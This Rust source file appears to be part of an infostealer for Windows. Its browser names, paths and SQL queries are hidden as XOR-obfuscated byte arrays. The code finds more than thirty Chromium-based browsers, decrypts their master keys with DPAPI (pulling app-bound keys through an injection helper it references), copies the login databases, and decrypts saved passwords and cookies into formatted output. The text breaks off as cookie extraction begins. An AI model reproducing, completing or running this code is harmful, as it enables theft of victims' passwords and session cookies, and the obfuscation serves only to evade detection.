use std::{env, fs, path::{Path, PathBuf}};
use rusqlite::Connection;
use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
use base64::{engine::general_purpose, Engine as _};
use serde_json::Value;
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

use super::{env_configured, xor_bytes, xor_str};

fn s_localappdata() -> String { xor_str(&[0x16, 0x15, 0x19, 0x1B, 0x16, 0x1B, 0x0A, 0x0A, 0x1E, 0x1B, 0x0E, 0x1B]) }
fn s_appdata() -> String { xor_str(&[0x1B, 0x0A, 0x0A, 0x1E, 0x1B, 0x0E, 0x1B]) }
fn s_chrome() -> String { xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x3F]) }
fn s_chrome_beta() -> String { xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x18, 0x3F, 0x2E, 0x3B]) }
fn s_chrome_dev() -> String { xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x1E, 0x3F, 0x2C]) }
fn s_chrome_canary() -> String { xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x19, 0x3B, 0x34, 0x3B, 0x28, 0x23]) }
fn s_chromium() -> String { xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x33, 0x2F, 0x37]) }
fn s_edge() -> String { xor_str(&[0x1F, 0x3E, 0x3D, 0x3F]) }
fn s_edge_beta() -> String { xor_str(&[0x1F, 0x3E, 0x3D, 0x3F, 0x7A, 0x18, 0x3F, 0x2E, 0x3B]) }
fn s_edge_dev() -> String { xor_str(&[0x1F, 0x3E, 0x3D, 0x3F, 0x7A, 0x1E, 0x3F, 0x2C]) }
fn s_brave() -> String { xor_str(&[0x18, 0x28, 0x3B, 0x2C, 0x3F]) }
fn s_brave_beta() -> String { xor_str(&[0x18, 0x28, 0x3B, 0x2C, 0x3F, 0x7A, 0x18, 0x3F, 0x2E, 0x3B]) }
fn s_brave_nightly() -> String { xor_str(&[0x18, 0x28, 0x3B, 0x2C, 0x3F, 0x7A, 0x14, 0x33, 0x3D, 0x32, 0x2E, 0x36, 0x23]) }
fn s_opera() -> String { xor_str(&[0x15, 0x2A, 0x3F, 0x28, 0x3B]) }
fn s_operagx() -> String { xor_str(&[0x15, 0x2A, 0x3F, 0x28, 0x3B, 0x1D, 0x02]) }
fn s_opera_neon() -> String { xor_str(&[0x15, 0x2A, 0x3F, 0x28, 0x3B, 0x7A, 0x14, 0x3F, 0x35, 0x34]) }
fn s_vivaldi() -> String { xor_str(&[0x0C, 0x33, 0x2C, 0x3B, 0x36, 0x3E, 0x33]) }
fn s_yandex() -> String { xor_str(&[0x03, 0x3B, 0x34, 0x3E, 0x3F, 0x22]) }
fn s_coccoc() -> String { xor_str(&[0x19, 0x35, 0x39, 0x19, 0x35, 0x39]) }
fn s_centbrowser() -> String { xor_str(&[0x19, 0x3F, 0x34, 0x2E, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28]) }
fn s_360chrome() -> String { xor_str(&[0x69, 0x6C, 0x6A, 0x19, 0x32, 0x28, 0x35, 0x37, 0x3F]) }
fn s_epic_privacy_browser() -> String { xor_str(&[0x1F, 0x2A, 0x33, 0x39, 0x7A, 0x0A, 0x28, 0x33, 0x2C, 0x3B, 0x39, 0x23, 0x7A, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28]) }
fn s_uran() -> String { xor_str(&[0x0F, 0x28, 0x3B, 0x34]) }
fn s_7star() -> String { xor_str(&[0x6D, 0x09, 0x2E, 0x3B, 0x28]) }
fn s_torch() -> String { xor_str(&[0x0E, 0x35, 0x28, 0x39, 0x32]) }
fn s_kometa() -> String { xor_str(&[0x11, 0x35, 0x37, 0x3F, 0x2E, 0x3B]) }
fn s_orbitum() -> String { xor_str(&[0x15, 0x28, 0x38, 0x33, 0x2E, 0x2F, 0x37]) }
fn s_amigo() -> String { xor_str(&[0x1B, 0x37, 0x33, 0x3D, 0x35]) }
fn s_sputnik() -> String { xor_str(&[0x09, 0x2A, 0x2F, 0x2E, 0x34, 0x33, 0x31]) }
fn s_slimjet() -> String { xor_str(&[0x09, 0x36, 0x33, 0x37, 0x30, 0x3F, 0x2E]) }
fn s_iridium() -> String { xor_str(&[0x13, 0x28, 0x33, 0x3E, 0x33, 0x2F, 0x37]) }
fn s_thorium() -> String { xor_str(&[0x0E, 0x32, 0x35, 0x28, 0x33, 0x2F, 0x37]) }
fn s_arc() -> String { xor_str(&[0x1B, 0x28, 0x39]) }
fn s_google() -> String { xor_str(&[0x1D, 0x35, 0x35, 0x3D, 0x36, 0x3F]) }
fn s_chrome_sxs() -> String { xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x7A, 0x09, 0x22, 0x09]) }
fn s_microsoft() -> String { xor_str(&[0x17, 0x33, 0x39, 0x28, 0x35, 0x29, 0x35, 0x3C, 0x2E]) }
fn s_bravesoftware() -> String { xor_str(&[0x18, 0x28, 0x3B, 0x2C, 0x3F, 0x09, 0x35, 0x3C, 0x2E, 0x2D, 0x3B, 0x28, 0x3F]) }
fn s_brave_browser() -> String { xor_str(&[0x18, 0x28, 0x3B, 0x2C, 0x3F, 0x77, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28]) }
fn s_brave_browser_beta() -> String { xor_str(&[0x18, 0x28, 0x3B, 0x2C, 0x3F, 0x77, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x77, 0x18, 0x3F, 0x2E, 0x3B]) }
fn s_brave_browser_nightly() -> String { xor_str(&[0x18, 0x28, 0x3B, 0x2C, 0x3F, 0x77, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x77, 0x14, 0x33, 0x3D, 0x32, 0x2E, 0x36, 0x23]) }
fn s_opera_software() -> String { xor_str(&[0x15, 0x2A, 0x3F, 0x28, 0x3B, 0x7A, 0x09, 0x35, 0x3C, 0x2E, 0x2D, 0x3B, 0x28, 0x3F]) }
fn s_opera_stable() -> String { xor_str(&[0x15, 0x2A, 0x3F, 0x28, 0x3B, 0x7A, 0x09, 0x2E, 0x3B, 0x38, 0x36, 0x3F]) }
fn s_opera_gx_stable() -> String { xor_str(&[0x15, 0x2A, 0x3F, 0x28, 0x3B, 0x7A, 0x1D, 0x02, 0x7A, 0x09, 0x2E, 0x3B, 0x38, 0x36, 0x3F]) }
fn s_yandexbrowser() -> String { xor_str(&[0x03, 0x3B, 0x34, 0x3E, 0x3F, 0x22, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28]) }
fn s_browser() -> String { xor_str(&[0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28]) }
fn s_ucozmedia() -> String { xor_str(&[0x2F, 0x19, 0x35, 0x20, 0x17, 0x3F, 0x3E, 0x33, 0x3B]) }
fn s_the_browser_company() -> String { xor_str(&[0x0E, 0x32, 0x3F, 0x7A, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x7A, 0x19, 0x35, 0x37, 0x2A, 0x3B, 0x34, 0x23]) }
fn s_user_data() -> String { xor_str(&[0x0F, 0x29, 0x3F, 0x28, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B]) }
fn s_local_state() -> String { xor_str(&[0x16, 0x35, 0x39, 0x3B, 0x36, 0x7A, 0x09, 0x2E, 0x3B, 0x2E, 0x3F]) }
fn s_os_crypt() -> String { xor_str(&[0x35, 0x29, 0x05, 0x39, 0x28, 0x23, 0x2A, 0x2E]) }
fn s_encrypted_key() -> String { xor_str(&[0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05, 0x31, 0x3F, 0x23]) }
fn s_app_bound_encrypted_key() -> String { xor_str(&[0x3B, 0x2A, 0x2A, 0x05, 0x38, 0x35, 0x2F, 0x34, 0x3E, 0x05, 0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05, 0x31, 0x3F, 0x23]) }
fn s_profile_info_cache() -> String { xor_str(&[0x75, 0x2A, 0x28, 0x35, 0x3C, 0x33, 0x36, 0x3F, 0x75, 0x33, 0x34, 0x3C, 0x35, 0x05, 0x39, 0x3B, 0x39, 0x32, 0x3F]) }
fn s_system_profile() -> String { xor_str(&[0x09, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x7A, 0x0A, 0x28, 0x35, 0x3C, 0x33, 0x36, 0x3F]) }
fn s_default() -> String { xor_str(&[0x1E, 0x3F, 0x3C, 0x3B, 0x2F, 0x36, 0x2E]) }
fn s_guest_profile() -> String { xor_str(&[0x1D, 0x2F, 0x3F, 0x29, 0x2E, 0x7A, 0x0A, 0x28, 0x35, 0x3C, 0x33, 0x36, 0x3F]) }
fn s_profile_prefix() -> String { xor_str(&[0x0A, 0x28, 0x35, 0x3C, 0x33, 0x36, 0x3F, 0x7A]) }
fn s_preferences() -> String { xor_str(&[0x0A, 0x28, 0x3F, 0x3C, 0x3F, 0x28, 0x3F, 0x34, 0x39, 0x3F, 0x29]) }
fn s_network() -> String { xor_str(&[0x14, 0x3F, 0x2E, 0x2D, 0x35, 0x28, 0x31]) }
fn s_cookies() -> String { xor_str(&[0x19, 0x35, 0x35, 0x31, 0x33, 0x3F, 0x29]) }
fn s_login_data() -> String { xor_str(&[0x16, 0x35, 0x3D, 0x33, 0x34, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B]) }
fn s_web_data() -> String { xor_str(&[0x0D, 0x3F, 0x38, 0x7A, 0x1E, 0x3B, 0x2E, 0x3B]) }
fn s_history() -> String { xor_str(&[0x12, 0x33, 0x29, 0x2E, 0x35, 0x28, 0x23]) }
fn s_cr_db_prefix() -> String { xor_str(&[0x39, 0x28, 0x05, 0x3E, 0x38, 0x05]) }
fn s_sqlite_ext() -> String { xor_str(&[0x74, 0x29, 0x2B, 0x36, 0x33, 0x2E, 0x3F]) }
fn s_wal() -> String { xor_str(&[0x77, 0x2D, 0x3B, 0x36]) }
fn s_shm() -> String { xor_str(&[0x77, 0x29, 0x32, 0x37]) }
fn s_journal() -> String { xor_str(&[0x77, 0x30, 0x35, 0x2F, 0x28, 0x34, 0x3B, 0x36]) }
fn s_sql_logins() -> String { xor_str(&[0x09, 0x1F, 0x16, 0x1F, 0x19, 0x0E, 0x7A, 0x35, 0x28, 0x33, 0x3D, 0x33, 0x34, 0x05, 0x2F, 0x28, 0x36, 0x76, 0x7A, 0x2F, 0x29, 0x3F, 0x28, 0x34, 0x3B, 0x37, 0x3F, 0x05, 0x2C, 0x3B, 0x36, 0x2F, 0x3F, 0x76, 0x7A, 0x2A, 0x3B, 0x29, 0x29, 0x2D, 0x35, 0x28, 0x3E, 0x05, 0x2C, 0x3B, 0x36, 0x2F, 0x3F, 0x7A, 0x1C, 0x08, 0x15, 0x17, 0x7A, 0x36, 0x35, 0x3D, 0x33, 0x34, 0x29]) }
fn s_sql_cookies() -> String { xor_str(&[0x09, 0x1F, 0x16, 0x1F, 0x19, 0x0E, 0x7A, 0x32, 0x35, 0x29, 0x2E, 0x05, 0x31, 0x3F, 0x23, 0x76, 0x7A, 0x34, 0x3B, 0x37, 0x3F, 0x76, 0x7A, 0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05, 0x2C, 0x3B, 0x36, 0x2F, 0x3F, 0x76, 0x7A, 0x2C, 0x3B, 0x36, 0x2F, 0x3F, 0x76, 0x7A, 0x2A, 0x3B, 0x2E, 0x32, 0x76, 0x7A, 0x3F, 0x22, 0x2A, 0x33, 0x28, 0x3F, 0x29, 0x05, 0x2F, 0x2E, 0x39, 0x76, 0x7A, 0x33, 0x29, 0x05, 0x29, 0x3F, 0x39, 0x2F, 0x28, 0x3F, 0x76, 0x7A, 0x33, 0x29, 0x05, 0x32, 0x2E, 0x2E, 0x2A, 0x35, 0x34, 0x36, 0x23, 0x7A, 0x1C, 0x08, 0x15, 0x17, 0x7A, 0x39, 0x35, 0x35, 0x31, 0x33, 0x3F, 0x29]) }
fn s_sql_autofill() -> String { xor_str(&[0x09, 0x1F, 0x16, 0x1F, 0x19, 0x0E, 0x7A, 0x34, 0x3B, 0x37, 0x3F, 0x76, 0x7A, 0x2C, 0x3B, 0x36, 0x2F, 0x3F, 0x76, 0x7A, 0x39, 0x35, 0x2F, 0x34, 0x2E, 0x7A, 0x1C, 0x08, 0x15, 0x17, 0x7A, 0x3B, 0x2F, 0x2E, 0x35, 0x3C, 0x33, 0x36, 0x36]) }
fn s_sql_history() -> String { xor_str(&[0x09, 0x1F, 0x16, 0x1F, 0x19, 0x0E, 0x7A, 0x2F, 0x28, 0x36, 0x76, 0x7A, 0x2E, 0x33, 0x2E, 0x36, 0x3F, 0x76, 0x7A, 0x2C, 0x33, 0x29, 0x33, 0x2E, 0x05, 0x39, 0x35, 0x2F, 0x34, 0x2E, 0x76, 0x7A, 0x36, 0x3B, 0x29, 0x2E, 0x05, 0x2C, 0x33, 0x29, 0x33, 0x2E, 0x05, 0x2E, 0x33, 0x37, 0x3F, 0x7A, 0x1C, 0x08, 0x15, 0x17, 0x7A, 0x2F, 0x28, 0x36, 0x29, 0x7A, 0x15, 0x08, 0x1E, 0x1F, 0x08, 0x7A, 0x18, 0x03, 0x7A, 0x36, 0x3B, 0x29, 0x2E, 0x05, 0x2C, 0x33, 0x29, 0x33, 0x2E, 0x05, 0x2E, 0x33, 0x37, 0x3F, 0x7A, 0x1E, 0x1F, 0x09, 0x19]) }
fn s_v20() -> String { xor_str(&[0x2C, 0x68, 0x6A]) }
fn s_v10() -> String { xor_str(&[0x2C, 0x6B, 0x6A]) }
fn s_v11() -> String { xor_str(&[0x2C, 0x6B, 0x6B]) }
fn s_legacy() -> String { xor_str(&[0x36, 0x3F, 0x3D, 0x3B, 0x39, 0x23]) }
fn s_encrypted_fmt() -> String { xor_str(&[0x01, 0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x7A, 0x77, 0x7A, 0x21, 0x27, 0x07]) }
fn s_password_fmt() -> String { xor_str(&[0x0F, 0x08, 0x16, 0x60, 0x7A, 0x21, 0x27, 0x50, 0x0F, 0x29, 0x3F, 0x28, 0x34, 0x3B, 0x37, 0x3F, 0x60, 0x7A, 0x21, 0x27, 0x50, 0x0A, 0x3B, 0x29, 0x29, 0x2D, 0x35, 0x28, 0x3E, 0x60, 0x7A, 0x21, 0x27, 0x50, 0x21, 0x27, 0x50]) }
fn s_autofill_fmt() -> String { xor_str(&[0x14, 0x3B, 0x37, 0x3F, 0x60, 0x7A, 0x21, 0x27, 0x50, 0x0C, 0x3B, 0x36, 0x2F, 0x3F, 0x60, 0x7A, 0x21, 0x27, 0x50, 0x19, 0x35, 0x2F, 0x34, 0x2E, 0x60, 0x7A, 0x21, 0x27, 0x50, 0x21, 0x27, 0x50]) }
fn s_history_fmt() -> String { xor_str(&[0x0F, 0x08, 0x16, 0x60, 0x7A, 0x21, 0x27, 0x50, 0x0E, 0x33, 0x2E, 0x36, 0x3F, 0x60, 0x7A, 0x21, 0x27, 0x50, 0x0C, 0x33, 0x29, 0x33, 0x2E, 0x29, 0x60, 0x7A, 0x21, 0x27, 0x50, 0x16, 0x3B, 0x29, 0x2E, 0x7A, 0x0C, 0x33, 0x29, 0x33, 0x2E, 0x60, 0x7A, 0x21, 0x27, 0x50, 0x21, 0x27, 0x50]) }
fn s_sep50() -> String { xor_str(&[0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77]) }
fn s_dot() -> String { xor_str(&[0x74]) }
fn v20_prefix() -> Vec<u8> { xor_bytes(&[0x2C, 0x68, 0x6A]) }
fn v10_prefix() -> Vec<u8> { xor_bytes(&[0x2C, 0x6B, 0x6A]) }
fn v11_prefix() -> Vec<u8> { xor_bytes(&[0x2C, 0x6B, 0x6B]) }

fn apply_template(template: &str, values: &[&str]) -> String {
    let mut out = String::new();
    let mut rest = template;
    for value in values {
        if let Some(pos) = rest.find("{}") {
            out.push_str(&rest[..pos]);
            out.push_str(value);
            rest = &rest[pos + 2..];
        }
    }
    out.push_str(rest);
    out
}

struct BrowserInfo {
    name: String,
    user_data: PathBuf,
    has_profiles: bool,
}

struct MasterKeys {
    standard: Vec<u8>,
    app_bound: Option<Vec<u8>>,
}

fn get_browsers() -> Vec<BrowserInfo> {
    let local = env::var(s_localappdata()).unwrap_or_default();
    let roaming = env::var(s_appdata()).unwrap_or_default();
    vec![
        BrowserInfo {
            name: s_chrome(),
            user_data: PathBuf::from(&local).join(s_google()).join(s_chrome()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_chrome_beta(),
            user_data: PathBuf::from(&local).join(s_google()).join(s_chrome_beta()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_chrome_dev(),
            user_data: PathBuf::from(&local).join(s_google()).join(s_chrome_dev()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_chrome_canary(),
            user_data: PathBuf::from(&local).join(s_google()).join(s_chrome_sxs()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_chromium(),
            user_data: PathBuf::from(&local).join(s_chromium()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_edge(),
            user_data: PathBuf::from(&local).join(s_microsoft()).join(s_edge()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_edge_beta(),
            user_data: PathBuf::from(&local).join(s_microsoft()).join(s_edge_beta()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_edge_dev(),
            user_data: PathBuf::from(&local).join(s_microsoft()).join(s_edge_dev()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_brave(),
            user_data: PathBuf::from(&local).join(s_bravesoftware()).join(s_brave_browser()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_brave_beta(),
            user_data: PathBuf::from(&local).join(s_bravesoftware()).join(s_brave_browser_beta()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_brave_nightly(),
            user_data: PathBuf::from(&local).join(s_bravesoftware()).join(s_brave_browser_nightly()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_opera(),
            user_data: PathBuf::from(&roaming).join(s_opera_software()).join(s_opera_stable()),
            has_profiles: false,
        },
        BrowserInfo {
            name: s_operagx(),
            user_data: PathBuf::from(&roaming).join(s_opera_software()).join(s_opera_gx_stable()),
            has_profiles: false,
        },
        BrowserInfo {
            name: s_opera_neon(),
            user_data: PathBuf::from(&roaming).join(s_opera_software()).join(s_opera_neon()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_vivaldi(),
            user_data: PathBuf::from(&local).join(s_vivaldi()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_yandex(),
            user_data: PathBuf::from(&local).join(s_yandex()).join(s_yandexbrowser()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_coccoc(),
            user_data: PathBuf::from(&local).join(s_coccoc()).join(s_browser()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_centbrowser(),
            user_data: PathBuf::from(&local).join(s_centbrowser()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_360chrome(),
            user_data: PathBuf::from(&local).join(s_360chrome()).join(s_chrome()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_epic_privacy_browser(),
            user_data: PathBuf::from(&local).join(s_epic_privacy_browser()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_uran(),
            user_data: PathBuf::from(&local).join(s_ucozmedia()).join(s_uran()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_7star(),
            user_data: PathBuf::from(&local).join(s_7star()).join(s_7star()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_torch(),
            user_data: PathBuf::from(&local).join(s_torch()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_kometa(),
            user_data: PathBuf::from(&local).join(s_kometa()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_orbitum(),
            user_data: PathBuf::from(&local).join(s_orbitum()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_amigo(),
            user_data: PathBuf::from(&local).join(s_amigo()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_sputnik(),
            user_data: PathBuf::from(&local).join(s_sputnik()).join(s_sputnik()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_slimjet(),
            user_data: PathBuf::from(&local).join(s_slimjet()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_iridium(),
            user_data: PathBuf::from(&local).join(s_iridium()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_thorium(),
            user_data: PathBuf::from(&local).join(s_thorium()).join(s_user_data()),
            has_profiles: true,
        },
        BrowserInfo {
            name: s_arc(),
            user_data: PathBuf::from(&local).join(s_the_browser_company()).join(s_arc()).join(s_user_data()),
            has_profiles: true,
        },
    ]
}


fn dpapi_decrypt(data: &[u8], entropy: Option<&[u8]>, flags: u32) -> Option<Vec<u8>> {
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        let mut ent_blob = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        let ent_ptr = match entropy {
            Some(e) => {
                ent_blob.cbData = e.len() as u32;
                ent_blob.pbData = e.as_ptr() as *mut u8;
                Some(&ent_blob as *const CRYPT_INTEGER_BLOB)
            }
            None => None,
        };
        if CryptUnprotectData(&mut input, None, ent_ptr, None, None, flags, &mut output).is_ok() {
            Some(std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec())
        } else {
            None
        }
    }
}

fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<MasterKeys> {
    let local_state = user_data_path.join(s_local_state());
    let content = fs::read_to_string(&local_state).ok()?;
    let json: Value = serde_json::from_str(&content).ok()?;

    let enc_key = json[s_os_crypt()][s_encrypted_key()].as_str()?;
    let decoded = general_purpose::STANDARD.decode(enc_key).ok()?;
    if decoded.len() < 5 { return None; }
    let standard = dpapi_decrypt(&decoded[5..], None, 0)?;

    let has_app_bound = json[s_os_crypt()][s_app_bound_encrypted_key()].as_str().is_some();
    let app_bound = if has_app_bound {
        super::dpapi_fallback::try_from_local_state(&json).or_else(|| {
            super::chrome_inject::fetch_app_bound_key(browser_name)
        })
    } else {
        None
    };

    Some(MasterKeys { standard, app_bound })
}

fn aes_gcm_decrypt(data: &[u8], key: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 15 || key.len() != 32 { return None; }
    let iv = &data[3..15];
    let ciphertext = &data[15..];
    if ciphertext.len() < 16 { return None; }
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
    let nonce = Nonce::from_slice(iv);
    cipher.decrypt(nonce, ciphertext).ok()
}

fn chacha20_decrypt(data: &[u8], key: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 15 || key.len() != 32 { return None; }
    let iv = &data[3..15];
    let ciphertext = &data[15..];
    if ciphertext.len() < 16 { return None; }
    use chacha20poly1305::{ChaCha20Poly1305, KeyInit, aead::Aead as _};
    let cipher = ChaCha20Poly1305::new_from_slice(key).ok()?;
    cipher.decrypt(iv.into(), ciphertext).ok()
}

fn aead_decrypt(data: &[u8], key: &[u8]) -> Option<Vec<u8>> {
    aes_gcm_decrypt(data, key).or_else(|| chacha20_decrypt(data, key))
}

fn cookie_plaintext(pt: &[u8], is_v20: bool) -> String {
    let data = if is_v20 && pt.len() > 32 { &pt[32..] } else { pt };
    String::from_utf8_lossy(data).into_owned()
}

fn decrypt_cookie_blob(blob: &[u8], keys: &MasterKeys) -> Option<String> {
    if blob.len() < 3 {
        return None;
    }

    let try_decrypt = |key: &[u8]| -> Option<String> {
        aead_decrypt(blob, key).map(|pt| cookie_plaintext(&pt, blob.starts_with(&v20_prefix())))
    };

    if blob.starts_with(&v20_prefix()) {
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(v) = try_decrypt(ab_key) {
                if !v.is_empty() {
                    return Some(v);
                }
            }
        }
        if let Some(v) = try_decrypt(&keys.standard) {
            if !v.is_empty() {
                return Some(v);
            }
        }
        return None;
    }

    if blob.starts_with(&v10_prefix()) || blob.starts_with(&v11_prefix()) {
        if let Some(v) = try_decrypt(&keys.standard) {
            if !v.is_empty() {
                return Some(v);
            }
        }
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(v) = try_decrypt(ab_key) {
                if !v.is_empty() {
                    return Some(v);
                }
            }
        }
        return None;
    }

    None
}

fn decrypt_cookie_value(encrypted: &[u8], plain_value: &str, keys: &MasterKeys) -> String {
    if encrypted.is_empty() {
        return plain_value.to_string();
    }

    for skip in [0usize, 32, 1, 3] {
        if encrypted.len() > skip + 3 {
            if let Some(value) = decrypt_cookie_blob(&encrypted[skip..], keys) {
                if !value.is_empty() {
                    return value;
                }
            }
        }
    }

    if let Some(dec) = dpapi_decrypt(encrypted, None, 0) {
        let value = cookie_plaintext(&dec, false);
        if !value.is_empty() {
            return value;
        }
    }

    if !plain_value.is_empty() {
        return plain_value.to_string();
    }

    String::new()
}

fn password_plaintext(pt: &[u8], is_v20: bool) -> Option<String> {
    if is_v20 && pt.len() > 32 {
        if let Ok(s) = String::from_utf8(pt[32..].to_vec()) {
            if !s.is_empty() {
                return Some(s);
            }
        }
    }
    String::from_utf8(pt.to_vec()).ok()
}

fn decrypt_value(encrypted: &[u8], keys: &MasterKeys) -> Option<String> {
    if encrypted.is_empty() { return Some(String::new()); }
    if encrypted.len() > 3 && encrypted.starts_with(&v20_prefix()) {
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(pt) = aead_decrypt(encrypted, ab_key) {
                if let Some(s) = password_plaintext(&pt, true) {
                    return Some(s);
                }
            }
        }
        if let Some(pt) = aead_decrypt(encrypted, &keys.standard) {
            if let Some(s) = password_plaintext(&pt, true) {
                return Some(s);
            }
        }
        return None;
    }
    if encrypted.len() > 3 && (encrypted.starts_with(&v10_prefix()) || encrypted.starts_with(&v11_prefix())) {
        if let Some(pt) = aead_decrypt(encrypted, &keys.standard) {
            if let Some(s) = password_plaintext(&pt, false) {
                return Some(s);
            }
        }
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(pt) = aead_decrypt(encrypted, ab_key) {
                if let Some(s) = password_plaintext(&pt, false) {
                    return Some(s);
                }
            }
        }
        return None;
    }
    dpapi_decrypt(encrypted, None, 0).and_then(|d| String::from_utf8(d).ok())
}

fn copy_db(db_path: &Path) -> Option<PathBuf> {
    if !db_path.exists() { return None; }
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let temp = env::temp_dir().join(format!("{}{}{}", s_cr_db_prefix(), nanos, s_sqlite_ext()));
    fs::copy(db_path, &temp).ok()?;
    let db_name = db_path.to_string_lossy().to_string();
    let temp_name = temp.to_string_lossy().to_string();
    for suffix in [s_wal(), s_shm(), s_journal()] {
        let src = PathBuf::from(format!("{db_name}{suffix}"));
        if src.exists() {
            let dst = PathBuf::from(format!("{temp_name}{suffix}"));
            let _ = fs::copy(&src, &dst);
        }
    }
    Some(temp)
}

fn cleanup_db(temp: &Path) {
    let temp_name = temp.to_string_lossy().to_string();
    let suffixes = [String::new(), s_wal(), s_shm(), s_journal()];
    for suffix in suffixes {
        let path = PathBuf::from(format!("{temp_name}{suffix}"));
        let _ = fs::remove_file(&path);
    }
}

fn version_label(password_enc: &[u8]) -> String {
    if password_enc.starts_with(&v20_prefix()) {
        s_v20()
    } else if password_enc.starts_with(&v10_prefix()) {
        s_v10()
    } else if password_enc.starts_with(&v11_prefix()) {
        s_v11()
    } else {
        s_legacy()
    }
}

fn extract_passwords(profile_path: &Path, keys: &MasterKeys) -> Option<String> {
    let temp = copy_db(&profile_path.join(s_login_data()))?;
    let conn = Connection::open(&temp).ok()?;
    let mut stmt = conn.prepare(&s_sql_logins()).ok()?;
    let mut output = String::new();
    let rows = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let username: String = row.get(1)?;
        let password: Vec<u8> = row.get(2)?;
        Ok((url, username, password))
    }).ok()?;
    for row in rows.flatten() {
        let (url, username, password_enc) = row;
        if password_enc.is_empty() && username.is_empty() { continue; }
        let version = version_label(&password_enc);
        let password = decrypt_value(&password_enc, keys)
            .unwrap_or_else(|| apply_template(&s_encrypted_fmt(), &[&version]));
        output.push_str(&apply_template(
            &s_password_fmt(),
            &[&url, &username, &password, &s_sep50()],
        ));
    }
    drop(stmt); drop(conn); cleanup_db(&temp);
    if output.is_empty() { None } else { Some(output) }
}

fn extract_cookies(profile_path: &Path, keys: &MasterKeys) -> Option<String> {
